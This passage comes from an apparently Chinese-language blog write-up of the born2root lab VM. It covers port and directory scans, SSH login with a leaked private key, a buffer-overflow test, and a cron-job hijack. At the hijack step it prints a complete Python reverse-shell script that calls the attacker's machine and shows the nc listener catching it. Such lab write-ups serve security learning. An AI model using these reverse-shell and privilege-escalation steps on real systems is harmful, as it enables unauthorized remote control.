XSS.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /files/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /icons/: Potentially interesting folder w/ directory listing</span><br><span class="hljs-string">|_  /manual/: Potentially interesting folder</span><br><span class="hljs-string">111/tcp   open  rpcbind</span><br><span class="hljs-string">46650/tcp open  unknown</span><br><span class="hljs-string">MAC Address: 08:00:27:81:98:42 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 61.72 seconds</span><br></code></pre></td></tr></table></figure><p>漏洞脚本扫描的结果中多了两个目录 <code>\icons</code> <code>\manual</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.135              <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 12:27 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> secretsec.com (192.168.56.135)<br>Host is up (0.0037s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    open|filtered dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   closed        ntp<br>135/udp   open|filtered msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   open|filtered snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   open|filtered isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  open|filtered ms-sql-m<br>1900/udp  open|filtered upnp<br>4500/udp  open|filtered nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:81:98:42 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.01 seconds<br></code></pre></td></tr></table></figure><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>UDP 扫描结果没收获，接下来进入 Web 界面进行查看，同时进行目录爆破。首页是一些公司相关信息和人名信息，使用 cewl 工具收集信息。</p><p><img src="/pic/91d99b2f8bac5f01e9082222e2987249_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.135 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,rar,txt,zip,sql<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.135<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              zip,sql,php,rar,txt<br>[+] Timeout:                 10s<br>===============================================================<br>2023/08/17 16:18:46 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/icons                (Status: 301) [Size: 316] [--&gt; http://192.168.56.135/icons/]<br>/files                (Status: 301) [Size: 316] [--&gt; http://192.168.56.135/files/]<br>/manual               (Status: 301) [Size: 317] [--&gt; http://192.168.56.135/manual/]<br>/robots.txt           (Status: 200) [Size: 57]<br>/server-status        (Status: 403) [Size: 302]<br>Progress: 1322350 / 1323366 (99.92%)<br>===============================================================<br>2023/08/17 16:23:13 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>没有新的暴露的信息，继续查看 Web 界面，先看看 <code>robots.txt</code> 有两个路径分别查看</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/wordpress-blog<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/files<br></code></pre></td></tr></table></figure><p>似乎被嘲讽了，不过还是得把图片保存下来，因为图看起来缺了一部分，需要查查有没有问题</p><p><img src="/pic/e41fa5afa47a5757790524ef9369f07f_MD5.png"></p><p>使用 strings, file, exiftool, binwalk 均未发现异常（由于信息太多，这里仅列出以下一部分）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ file index.jpeg <br>index.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: <span class="hljs-string">&quot;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 100&quot;</span>, baseline, precision 8, 850x315, components 3<br></code></pre></td></tr></table></figure><p>修改图片高度</p><p><img src="/pic/46967f2cca31ac14982b711a6eb32a4d_MD5.png"></p><h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><p>还尝试了搜一搜原图，依然没收获，可能这张图本来就是这样吧。还尝试了对 <code>wordpress-blog</code> 进行了目录爆破，依然没收获。继续看看别的目录。</p><p><img src="/pic/7ebd8bf5dadfb36f9ae47d9144e52b79_MD5.png"></p><p>有点奇怪，下载下来看看</p><p><img src="/pic/96c81f72088661f56e1736c6413efb00_MD5.png"></p><p>看起来似乎是私钥，将其写入本地文件中，修改权限为 600，尝试使用 ssh 登录，用户名的话，首页信息中看到了联系人的邮箱名字，先使用这个进行尝试吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo ssh -i privatekey martin@192.168.56.135                      <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>The authenticity of host <span class="hljs-string">&#x27;192.168.56.135 (192.168.56.135)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:y7AzR/QI4CJW3DLNEfBYopBbKkUP12PZv3vt+1ZQP6E.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.135<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">sign_and_send_pubkey: no mutual signature supported</span><br><span class="hljs-string">martin@192.168.56.135\&#x27;</span>s password: <br><br>Permission denied, please try again.<br>martin@192.168.56.135\<span class="hljs-string">&#x27;s password</span><br></code></pre></td></tr></table></figure><p>依然要输密码，不过情况看起来可能是算法不匹配的问题 <code>sign_and_send_pubkey: no mutual signature supported</code>，尝试直接谷歌搜索这个</p><p><img src="/pic/a471492f166c90d041730281da12a73f_MD5.png"></p><p>翻找了一下找到了答案，不过这里更好地处理方法是增加 ssh 参数，然后进行分析判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">debug1: Next authentication method: publickey<br>debug1: Trying private key: privatekey<br>sign_and_send_pubkey: no mutual signature supported<br>debug2: we did not send a packet, <span class="hljs-built_in">disable</span> method<br>debug1: Next authentication method: password<br>martin@192.168.56.135<span class="hljs-string">&#x27;s password:</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i privatekey martin@192.168.56.135                   <br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Fri Jun  9 20:31:29 2017 from 192.168.0.42<br><br>READY TO ACCESS THE SECRET LAB ? <br><br>secret password : ^CTraceback (most recent call last):<br>  File <span class="hljs-string">&quot;/var/tmp/login.py&quot;</span>, line 8, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    password = raw_input(<span class="hljs-string">&quot;secret password : &quot;</span>)<br>KeyboardInterrupt<br>martin@debian:~$ <span class="hljs-built_in">whoami</span><br>martin<br>martin@debian:~$ <span class="hljs-built_in">id</span><br>uid=1001(martin) gid=1001(martin) groupes=1001(martin)<br>martin@debian:~$ w<br> 00:28:02 up  6:43,  1 user,  load average: 0,00, 0,01, 0,08<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>martin   pts/0    192.168.56.106   00:26    1.00s  0.05s  0.00s w<br>martin@debian:~$ <span class="hljs-built_in">id</span><br>uid=1001(martin) gid=1001(martin) groupes=1001(martin)<br>martin@debian:~$ sudo -l<br>-bash: sudo : commande introuvable<br>martin@debian:~$ <span class="hljs-built_in">uname</span> -a<br>Linux debian 3.16.0-4-586 <span class="hljs-comment">#1 Debian 3.16.39-1+deb8u2 (2017-03-07) i686 GNU/Linux</span><br>martin@debian:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:81:98:42 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.135/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe81:9842/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>martin@debian:~$ <span class="hljs-built_in">ls</span> -alih<br>total 28K<br>128334 drwxr-xr-x 3 martin martin 4,0K juin   8  2017 .<br>128262 drwxr-xr-x 5 root   root   4,0K juin   9  2017 ..<br>128341 -rw------- 1 martin martin  613 août  18 00:28 .bash_history<br>128335 -rw-r--r-- 1 martin martin  220 juin   7  2017 .bash_logout<br>128337 -rwx--x--x 1 martin martin 3,5K juin   7  2017 .bashrc<br>128336 -rw-r--r-- 1 martin martin  675 juin   7  2017 .profile<br>128338 drwxr-xr-x 2 root   root   4,0K juin   7  2017 .ssh<br></code></pre></td></tr></table></figure><p>显示要输入密码，我下意识 ctrl+c 结果直接报错了，看起来是 python 写的脚本在登录的时候自动触发，不过看起来用处不是很大</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:~$ <span class="hljs-built_in">cat</span> .bash_history <br>nano /var/tmp/login.py<br>nano .bashrc<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span> -ah<br>sudo su<br><span class="hljs-built_in">exit</span><br>nano /var/tmp/login.py<br>clear<br>nano /var/tmp/login.py<br>su root<br><span class="hljs-built_in">ls</span><br>su root<br>clear<br>su root<br>clear<br><span class="hljs-built_in">cd</span> /var/www/html/icons/<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">mv</span> VdXAsOKisAOIO.txt.png key.txt.png<br>su root<br>su roo<br>su root<br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">ls</span><br>su root<br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">logout</span><br></code></pre></td></tr></table></figure><p><code>/var/tmp/login.py</code> 查看查看这个文件的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:~$ <span class="hljs-built_in">ls</span> -laih /var/tmp/login.py<br>55 -r-x------ 1 martin martin 263 juin   8  2017 /var/tmp/login.py<br>martin@debian:~$ <span class="hljs-built_in">cat</span> /var/tmp/login.py<br><span class="hljs-comment">#!/usr/bin/python</span><br><br>import os<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;READY TO ACCESS THE SECRET LAB ? &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>password = raw_input(<span class="hljs-string">&quot;secret password : &quot;</span>)<br><br><span class="hljs-keyword">if</span> (password) == <span class="hljs-string">&quot;secretsec&quot;</span> or <span class="hljs-string">&quot;secretlab&quot;</span> :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WELCOME ! &quot;</span>)<br><span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GET OUT ! &quot;</span>)<br>        os.system(<span class="hljs-string">&quot;pkill -u &#x27;martin&#x27;&quot;</span>)<br></code></pre></td></tr></table></figure><p>脚本看起来有点废，尤其是中间的判断语句 <code>if (password) == &quot;secretsec&quot; or &quot;secretlab&quot;</code> 这样的话不就肯定是 true 了，用户无论输入什么都能进入</p><p>而且权限也不让人很在意，脚本中的两个口令先收集起来，或许可以用来碰撞，尝试 su 命令使用上面两个口令作为密码。但是均失败了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:/home$ <span class="hljs-built_in">ls</span> -laih<br>total 20K<br>128262 drwxr-xr-x  5 root   root   4,0K juin   9  2017 .<br>     2 drwxr-xr-x 21 root   root   4,0K avril 26  2017 ..<br>141088 drwxr-xr-x  3 hadi   hadi   4,0K juin   5  2017 hadi<br>141985 drwx------  2 jimmy  jimmy  4,0K juin   9  2017 jimmy<br>128334 drwxr-xr-x  3 martin martin 4,0K juin   8  2017 martin<br></code></pre></td></tr></table></figure><p>home 目录中存在三个用户，只有 hadi 可以进去查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:/home/hadi$ <span class="hljs-built_in">ls</span> -alih<br>total 60K<br>141088 drwxr-xr-x 3 hadi hadi 4,0K juin   5  2017 .<br>128262 drwxr-xr-x 5 root root 4,0K juin   9  2017 ..<br>141089 -rw-r--r-- 1 hadi hadi  220 avril 26  2017 .bash_logout<br>141091 -rw-r--r-- 1 hadi hadi 3,5K avril 26  2017 .bashrc<br>128327 -rwxr-xr-x 1 root root 5,3K mai   10  2017 buff<br>141549 -rw-r--r-- 1 root root 1,1K mai   10  2017 buff.c<br>128332 -rw-r--r-- 1 root root  148 juin   5  2017 example.c<br>128329 -rw------- 1 root root 2,1K juin   5  2017 .gdb_history<br>128340 -rwxr-xr-x 1 root root 5,9K juin   5  2017 overflow<br>128328 -rw-r--r-- 1 root root   19 mai   10  2017 peda-session-buff.txt<br>128333 -rw-r--r-- 1 root root    5 juin   5  2017 peda-session-overflow.txt<br>141090 -rw-r--r-- 1 hadi hadi  675 avril 26  2017 .profile<br>141097 drwxr-xr-x 2 hadi hadi 4,0K mai    1  2017 .ssh<br></code></pre></td></tr></table></figure><p>缓冲区溢出的漏洞？不过这权限也不是 SUID 啊，看不懂了，不过顺便补一补 Linux 上调试缓冲区溢出的知识。</p><p><a href="https://ravi5hanka.medium.com/privilege-escalation-in-linux-via-a-local-buffer-overflow-dcee4f9b4a49">Privilege Escalation in Linux via a Local Buffer Overflow | by Ravishanka Silva | Medium</a></p><p>当输入为 260 个 A 时的内存区</p><p><img src="/pic/376b981e22b04dd754bc9ec20a360761_MD5.png"></p><p>框出来的是，经过测试发现指针的指向</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting program: /home/hadi/overflow $(python2 -c <span class="hljs-string">&#x27;print &quot;A&quot;* 236 +&quot;B&quot;*24&#x27;</span>)<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBB<br><br>Program received signal SIGSEGV, Segmentation fault.<br>0x42424242 <span class="hljs-keyword">in</span> ?? ()<br></code></pre></td></tr></table></figure><p>仅作简单记录，实际上这个程序漏洞无法用来提权</p><h2 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h2><p>接下来我看了敏感文件的权限和网站目录下的文件夹，以及定时任务和 SUID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:/home/hadi$ <span class="hljs-built_in">cat</span> /etc/crontab <br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br>*/5   * * * *   jimmy   python /tmp/sekurity.py<br></code></pre></td></tr></table></figure><p>jimmy 用户的定时任务每五分钟运行一次，不过 tmp 目录下是每次开关机都清空的，所以这里我们可以自己创建一个反弹 shell 的同名 python 文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Set the host and the port.                                                                                        </span><br>HOST = <span class="hljs-string">&quot;192.168.56.106&quot;</span>                                                                                             <br>PORT = <span class="hljs-number">443</span>                                                                                                          <br>                                                                                                                    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params">(<span class="hljs-params">host, port</span>)</span>):<br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.connect((host, port))<br>        <span class="hljs-keyword">return</span> s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wait_for_command</span>(<span class="hljs-params">s</span>):<br>        data = s.recv(<span class="hljs-number">1024</span>)<br>        <span class="hljs-keyword">if</span> data == <span class="hljs-string">&quot;quit\n&quot;</span>:<br>                s.close()<br>                sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-comment"># the socket died</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(data)==<span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># do shell command</span><br>                proc = subprocess.Popen(data, shell=<span class="hljs-literal">True</span>,<br>                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,<br>                        stdin=subprocess.PIPE)<br>                stdout_value = proc.stdout.read() + proc.stderr.read()<br>                s.send(stdout_value)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                socket_died=<span class="hljs-literal">False</span><br>                <span class="hljs-keyword">try</span>:<br>                        s=connect((HOST,PORT))<br>                        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> socket_died:<br>                                socket_died=wait_for_command(s)<br>                        s.close()<br>                <span class="hljs-keyword">except</span> socket.error:<br>                        <span class="hljs-keyword">pass</span><br>                time.sleep(<span class="hljs-number">5</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>        <span class="hljs-keyword">import</span> sys,os,subprocess,socket,time<br>        sys.exit(main())<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@debian:/tmp$ vi x.py <br>martin@debian:/tmp$ <span class="hljs-built_in">chmod</span> +x x.py<br><span class="hljs-comment"># 直接执行测试了一下能不能反弹shell，确认没问题了再修改为同名文件</span><br>martin@debian:/tmp$ <span class="hljs-built_in">mv</span> x.py sekurity.py<br></code></pre></td></tr></table></figure><p>不过反弹的 shell 因为是 sh 环境，想使用 python 完善 shell 的时候会卡死</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.135] 36957<br><span class="hljs-built_in">whoami</span><br>jimmy<br><span class="hljs-built_in">id</span><br>uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)<br><span class="hljs-built_in">ls</span><br>networker<br><span class="hljs-built_in">pwd</span><br>/home/jimmy<br><span class="hljs-built_in">ls</span> -liah<br>total 32K<br>141985 drwx------ 2 jimmy jimmy 4,0K juin   9  2017 .<br>128262 drwxr-xr-x 5 root  root  4,0K juin   9  2017 ..<br>141984 -rw-r--r-- 1 root  root    16 juin   9  2017 .bash_history<br>141986 -rw-r--r-- 1 jimmy jimmy  220 juin   8  2017 .bash_logout<br>141988 -rw-r--r-- 1 jimmy jimmy 3,5K juin   8  2017 .bashrc<br>141996 -rwsrwxrwx 1 root  root  7,4K juin   9  2017 networker<br>141987 -rw-r--r-- 1 jimmy jimmy  675 juin   8  2017 .profile<br><span class="hljs-built_in">cat</span> .bash_history<br>wget localhost<br></code></pre></td></tr></table></figure><p>networker 是有 SUID 的，strings 查看后发现只有 echo 不是绝对路径，但是这个有问题的 shell 无法修改 PATH，尝试换一个反弹 shell 的 python 文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> dup2<br><span class="hljs-keyword">from</span> subprocess <span 